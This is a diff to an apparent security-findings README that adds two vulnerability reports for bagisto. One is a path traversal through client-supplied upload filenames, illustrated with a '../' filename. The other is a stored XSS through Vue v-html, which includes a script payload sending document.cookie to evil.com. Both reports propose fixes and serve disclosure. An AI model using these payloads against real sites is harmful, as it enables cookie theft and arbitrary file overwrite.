@@ -8,8 +8,8 @@
 
 <div align="center">
 
-[![Repos Analyzed](https://img.shields.io/badge/Repos%20Analyzed-9+-0f0c29?style=flat-square)](.)
-[![Total Reported](https://img.shields.io/badge/Total%20Reported-8-302b63?style=flat-square)](.)
+[![Repos Analyzed](https://img.shields.io/badge/Repos%20Analyzed-10+-0f0c29?style=flat-square)](.)
+[![Total Reported](https://img.shields.io/badge/Total%20Reported-10-302b63?style=flat-square)](.)
 [![Confirmed Fixed](https://img.shields.io/badge/Confirmed%20Fixed-2-2ea44f?style=flat-square)](.)
 [![PRs Open](https://img.shields.io/badge/PRs%20Open-1-f0a500?style=flat-square)](.)
 
@@ -132,10 +132,53 @@ async cacheCommand(name: CommandName) {
 
 ---
 
+### 8 · bagisto — `getClientOriginalName()` path traversal in `RMAImageRepository` — incomplete security fix
+**Repo:** [bagisto/bagisto](https://github.com/bagisto/bagisto) · **9.1K+ ⭐**
+**Issue:** [#11338](https://github.com/bagisto/bagisto/issues/11338) 🔍 Open · **Date:** Jun 14, 2026
+
+A prior security fix correctly replaced `getClientOriginalName()` in `RequestController.php`, but `RMAImageRepository.php` was missed — it still uses the client-supplied filename directly as the storage path:
+
+```php
+// RMAImageRepository.php — manageImages() lines 25-28
+foreach ($requestImages as $itemImage) {
+    $this->create([
+        'rma_id' => $rma->id,
+        'path' => $itemImage->getClientOriginalName(),  // ⚠️ attacker-controlled
+    ]);
+}
+```
+
+An attacker can upload a file named `../../../../config/database.php` — the client-provided name is stored as the path without sanitization, enabling path traversal to overwrite arbitrary files on the server.
+
+**Fix:** Replace `getClientOriginalName()` with `store()` to generate a safe, random server-side path — matching the pattern already applied to `RequestController.php`.
+
+---
+
+### 9 · bagisto — `v-html` XSS in Shop views — `product_name` + datagrid columns unescaped
+**Repo:** [bagisto/bagisto](https://github.com/bagisto/bagisto) · **9.1K+ ⭐**
+**Issue:** [#11339](https://github.com/bagisto/bagisto/issues/11339) 🔍 Open · **Date:** Jun 14, 2026
+
+Multiple Shop views render user-controlled data via Vue's `v-html`, which bypasses HTML escaping — allowing stored XSS. A prior fix addressed `customer_name`, but `product_name` and datagrid `record[column.index]` remain unpatched.
+
+```html
+<!-- order-view.blade.php -->
+<p v-html="item.name"></p>  <!-- ⚠️ product name from DB — unescaped -->
+
+<!-- datagrid/table.blade.php -->
+<span v-html="record[column.index]"></span>  <!-- ⚠️ any column value — unescaped -->
+```
+
+A seller or admin with product-edit access can inject `<script>document.location='https://evil.com?c='+document.cookie</script>` as a product name. Every customer who views their order detail page executes the payload.
+
+**Fix:** Replace `v-html` with `{{ }}` interpolation (Vue's safe default) for all user-controlled string fields, matching the fix already applied to `customer_name`.
+
+---
+
 ## 📊 Analysis Log
 
 | Date | Repo | Commits Analyzed | Outcome |
 |:-----|:-----|:----------------:|:--------|
+| Jun 14 | bagisto/bagisto | 2 | 2 security bugs → issues #11338 (path traversal) #11339 (XSS) |
 | Jun 14 | apify/crawlee-python | 3 | Behavioral findings — silent URL filtering, exception propagation change |
 | Jun 14 | tox-dev/tox | 1 | Config override namespace risk identified |
 | Jun 14 | gptme/gptme | 1 | LLM routing refactor — HIGH risk noted |
